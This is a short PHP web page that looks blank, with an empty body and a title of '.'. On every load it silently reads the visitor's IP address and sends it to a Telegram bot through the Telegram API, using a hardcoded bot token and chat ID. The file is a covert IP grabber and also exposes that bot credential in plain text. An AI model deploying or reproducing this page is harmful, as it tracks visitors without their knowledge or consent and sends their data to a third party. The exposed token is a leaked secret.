<?php 
$ip = $_SERVER['REMOTE_ADDR'];

$token = '6522543945:AAHExxi_FP8O4fIuEKPYDovXqJMCxYs6wGA';

$my_id = '506038273';

$msg = 'ip: '.$ip;

file_get_contents("https://api.telegram.org/bot6522543945:AAHExxi_FP8O4fIuEKPYDovXqJMCxYs6wGA/sendMessage?chat_id=$my_id&text=$msg");

?>

<!DOCTYPE html>
<html>
<head>
    <title>.</title>
</head>
<body>

</body>
</html>